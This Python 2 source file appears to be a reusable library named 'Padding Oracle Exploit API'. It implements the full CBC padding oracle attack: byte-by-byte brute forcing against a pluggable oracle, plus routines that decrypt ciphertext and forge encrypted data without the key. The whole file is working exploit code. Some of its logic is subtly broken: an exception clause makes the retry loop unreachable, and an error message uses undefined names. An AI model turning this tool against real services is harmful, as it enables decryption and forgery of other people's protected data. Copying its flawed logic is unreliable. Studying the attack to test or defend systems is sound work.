# -*- coding: utf-8 -*-
'''
Padding Oracle Exploit API
~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
from itertools import izip, cycle, imap
import logging
from multiprocessing.pool import ThreadPool

__all__ = [
    'BadPaddingException',
    'PaddingOracle',
    ]


class BadPaddingException(Exception):
    '''
    Raised when a blackbox decryptor reveals a padding oracle.

    This Exception type should be raised in :meth:`.PaddingOracle.oracle`.
    '''

class ByteNotFoundException(Exception):
    '''
    Raised to signal that for the current byte fuzzed, no value was found 
    that results in a valid padding 
    '''
    def __init__(self, byte_num):
        super(ByteNotFoundException, self).__init__("Byte #%d not found" % byte_num)

class BlockBuster(object):
    '''
    Internally used to handle busting a single block. This class should 
    not be used by an application.
    '''
    def __init__(self, padding_oracle, block, block_size, 
            plaintext_translation=None, plaintext_after='', **kwargs):
        '''
        :param padding_oracle: An instance of :class`PaddingOracle`
        :param block: The current block to bust
        :param int block_size: Cipher block size (in bytes).
        :param plaintext_translation: When set should contain the values each 
            of the found bytes have to be XORed to to create a valid plain text
        :param plaintext_after: The plaintext after this block
        '''
        self.log = logging.getLogger(self.__class__.__name__)
        self.po = padding_oracle
        self.block = block
        self.block_size = block_size
        self.plaintext_translation = plaintext_translation
        self.kwargs = kwargs
        
        # contains the bytes that have already been identified
        self.intermediate_bytes = bytearray(block_size)
        self.plaintext_after = plaintext_after

        # the scratchpad for the actual attack
        # these bytes are sent to the oracle
        self.test_bytes = bytearray(block_size)  # '\x00\x00\x00\x00...'
        self.test_bytes.extend(block)
        
    def bust(self):
        '''
        Executes the attack for the given block.
        '''
        self.log.debug('Processing block %r', str(self.block))

        for retry in range(self.po.max_retries):
            try:
                self._bust_internal(self.test_bytes, self.block_size-1)
                
                return self.intermediate_bytes
            except Exception:
                self.log.exception('Caught unhandled exception!\n'
                       'Decrypted bytes so far: %r\n'
                       'Current variables: %r\n',
                       self.intermediate_bytes, self.__dict__)
                raise
            except ByteNotFoundException:
                self.log.exception('Unable to find a valid padding, retrying...')
        
        raise RuntimeError('Could not decrypt message in %r within '
           'maximum allotted retries (%d)' % (
           block, self.max_retries))
    
    def _bust_internal(self, test_bytes, byte_num):
        '''
        This method is (recursively) called for each byte position to fuzz.
        '''
        current_pad_byte = self.block_size - byte_num
        next_pad_byte = self.block_size - byte_num + 1
        
        # If possible, make an educated guess what the next plain text byte
        # might be
        if self.plaintext_translation is not None:
            # the plain text bytes from this block that are already known...
            plaintext_bytes = xor(
                    self.intermediate_bytes, 
                    self.plaintext_translation
                )[byte_num+1:]
            
            # ... and the plaintext from already busted blocks build
            # the currently known plaintext following the byte that is 
            # currently being busted.
            cur_plaintext_after = \
                ''.join([chr(_) for _ in plaintext_bytes]) \
                + self.plaintext_after
        
            # build an improved alphabet
            alphabet = self._build_alphabet(cur_plaintext_after, 
                current_pad_byte ^ self.plaintext_translation[byte_num])
        else:
            # no plain text hints, use standard alphabet
            alphabet = list(reversed(range(256)))
        
        # we need to specifically handle the last byte in a block:
        # assuming the current text is ...ab0232
        # we would then hit            ...ab0202 - a valid padding
        # When we brute force the last byte, when we see a valid padding,
        # we expect it to be a 1-byte padding. 
        # We can figure out that this is happening when we don't
        # find a valid padding for the 2nd-last byte.
        lastbyte = byte_num == self.block_size - 1
    
        while True:
            try:
                # find the byte that is accepted by the oracle
                accepted_byte_index = self._bust_byte(test_bytes, byte_num, alphabet)

                # the variable test_bytes was not modified by _bust_byte
                # so we need to update it here
                test_bytes[byte_num] = alphabet[accepted_byte_index]

                decrypted_byte = test_bytes[byte_num] ^ current_pad_byte

                self.intermediate_bytes[byte_num] = decrypted_byte
                
                for k in xrange(byte_num, self.block_size):
                    # XOR the current test byte with the padding value
                    # for this round to recover the decrypted byte
                    test_bytes[k] ^= current_pad_byte

                    # XOR it again with the padding byte for the
                    # next round
                    test_bytes[k] ^= next_pad_byte
                    
                if byte_num == 0:
                    # last byte of block is done
                    return
                
                # recurively call _bust_internal for the previous byte
                self._bust_internal(test_bytes[:], byte_num-1)
                return
            except ByteNotFoundException:
                if not lastbyte:
                    # the last byte might not be correct
                    raise
            
                # we have a 'false positive', at next try only use the 
                # part of the alphabet we haven't yet used
                alphabet = alphabet[accepted_byte_index+1:]
                
                # we already exhausted the alphabet
                if len(alphabet) == 0:
                    raise

    def _bust_byte(self, test_bytes, byte_num, alphabet):
        '''
        Queries the oracle. When configured, uses 
        multiple threads/processes. 
        '''
        # clear oracle history for each byte
        self.po.history = []
        
        jobs = []
        
        for i in range(len(alphabet)):
            # create a copy that is used only for one job
            cur_test_bytes = test_bytes[:]
            cur_test_bytes[byte_num] = alphabet[i]

            jobs.append((self.po, i, cur_test_bytes, self.kwargs))

        res_iter = imap(_worker_fnc, jobs) if self.po.pool is None else\
            self.po.pool.imap_unordered(_worker_fnc, jobs)

        for res in res_iter:
            self.po.attempts += 1
            
            if res is not None:
                return res
        
        self.log.debug("byte %d not found" % (byte_num))
        
        raise ByteNotFoundException(byte_num)
        
    def _build_alphabet(self, plaintext_after, xor_val):
        '''
        Builds an optimized alphabet for decryption.
        '''
        alphabet = []
        
        def add(it):
            for entry in it:
                val = ord(entry) ^ xor_val
            
                if val not in alphabet:
                    alphabet.append(val)
        
        if len(plaintext_after) > 0:
            next_byte = ord(plaintext_after[0])
            
            if (chr(next_byte) * next_byte).startswith(plaintext_after) \
                    and len(plaintext_after) < next_byte:
                # this might be unfinished padding, expect more padding
                add([chr(next_byte)])
        
        add(self.po.guess(plaintext_after))
        
        s = ' \r\n'
        # from https://en.oxforddictionaries.com/explore/which-letters-are-used-most
        s += 'eariotnslcudpmhgbfywkvxzjq'
        s += 'eariotnslcudpmhgbfywkvxzjq'.upper()
        s += '0123456789'
        s += '\t!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~'
        
        add([_ for _ in s])
        
        # all other chars
        add([chr(_) for _ in range(256)])
        
        assert len(alphabet) == 256
        
        return alphabet


def _worker_fnc(job):
    '''
    The function stub that calls the oracle. Must be a top-level function to 
    avoid problems with pickling it (when using :class`multiprocessing.Pool`). 
    '''
    po, i, test_bytes, kwargs = job
    try:
        po.oracle(test_bytes, **kwargs)

        return i
    except BadPaddingException:
        return None


class PaddingOracle(object):
    '''
    Implementations should subclass this object and implement
    the :meth:`oracle` method.

    :param int max_retries: Number of attempts per byte to reveal a
        padding oracle, default is 3. If an oracle does not reveal
        itself within `max_retries`, a :exc:`RuntimeError` is raised.
    '''

    def __init__(self, poolClass=ThreadPool, **kwargs):
        self.log = logging.getLogger(self.__class__.__name__)
        self.max_retries = int(kwargs.get('max_retries', 3))
        self.attempts = 0
        self.history = []
        self._decrypted = None
        self._encrypted = None
        self.poolClass = poolClass
        self.pool = None

    def oracle(self, data, **kwargs):
        '''
        Feeds *data* to a decryption function that reveals a Padding
        Oracle. If a Padding Oracle was revealed, this method
        should raise a :exc:`.BadPaddingException`, otherwise this
        method should just return.

        A history of all responses should be stored in :attr:`~.history`,
        regardless of whether they revealed a Padding Oracle or not.

        :param bytearray data: A bytearray of (fuzzed) encrypted bytes.
        :raises: :class:`BadPaddingException` if decryption reveals an
            oracle.
        '''
        raise NotImplementedError
        
    
    def guess(self, plaintext_after):
        '''
        This method is called during the decryption process. Based on 
        the known plaintext after the currently processed byte, it may
        guess what the currently processed byte may be. When the guess
        is correct, the decryption is speed up drastically.
        
        The method must return an iterable containing all guesses in
        descending order of likelyhood.
        
        This mechanism is especially useful if fragments of the plain 
        text are known.
        
        :param plaintext_after: the plaintext after the currently 
            processed byte
        :returns: An iterable with guesses for plaintext byte values
            (char)
        '''
        return []


    def encrypt(self, plaintext, block_size=8, iv=None, threads=1, **kwargs):
        '''
        Encrypts *plaintext* by exploiting a Padding Oracle.

        :param plaintext: Plaintext data to encrypt.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be null's.
        :returns: Encrypted data.
        '''
        self.pool = self.poolClass(threads) if threads > 1 else None
        
        try:
            pad = block_size - (len(plaintext) % block_size)
            plaintext = bytearray(plaintext + chr(pad) * pad)

            self.log.debug('Attempting to encrypt %r bytes', str(plaintext))

            if iv is not None:
                iv = bytearray(iv)
            else:
                iv = bytearray(block_size)

            self._encrypted = encrypted = iv
            block = encrypted

            n = len(plaintext + iv)
            while n > 0:
                intermediate_bytes = \
                    BlockBuster(self, block, block_size=block_size,
                                **kwargs).bust()

                block = xor(intermediate_bytes,
                            plaintext[n - block_size * 2:n + block_size])

                encrypted = block + encrypted

                n -= block_size

            return encrypted
        finally:
            if self.pool is not None:
                self.pool.terminate()

    def decrypt(self, ciphertext, block_size=8, iv=None, threads=1, **kwargs):
        '''
        Decrypts *ciphertext* by exploiting a Padding Oracle.

        :param ciphertext: Encrypted data.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be used.
        :returns: Decrypted data.
        '''
        self.pool = self.poolClass(threads) if threads > 1 else None
        
        try:
            ciphertext = bytearray(ciphertext)

            self.log.debug('Attempting to decrypt %r bytes', str(ciphertext))

            assert len(ciphertext) % block_size == 0, \
                "Ciphertext not of block size %d" % (block_size, )

            if iv is not None:
                iv, ctext = bytearray(iv), ciphertext
            else:
                iv, ctext = ciphertext[:block_size], ciphertext[block_size:]

            self._decrypted = decrypted = bytearray(len(ctext))

            temp = iv + ctext
            
            n = len(ctext) - block_size
            while len(temp) > block_size:
                plaintext_translation = temp[-2*block_size:-block_size]
                block = temp[-block_size:]
                temp = temp[:-block_size]

                intermediate_bytes = BlockBuster(self, block, block_size=block_size, 
                    plaintext_translation=plaintext_translation, 
                    plaintext_after=str(decrypted[n+block_size:]),
                    **kwargs).bust()

                # XOR the intermediate bytes with the the previous block (iv)
                # to get the plaintext

                decrypted[n:n + block_size] = xor(intermediate_bytes, plaintext_translation)

                self.log.info('Decrypted block %d: %r',
                              n / block_size, str(decrypted[n:n + block_size]))

                n -= block_size
            
            return decrypted
        finally:
            if self.pool is not None:
                self.pool.terminate()


def xor(data, key):
    '''
    XOR two bytearray objects with each other.
    '''
    return bytearray([x ^ y for x, y in izip(data, cycle(key))])
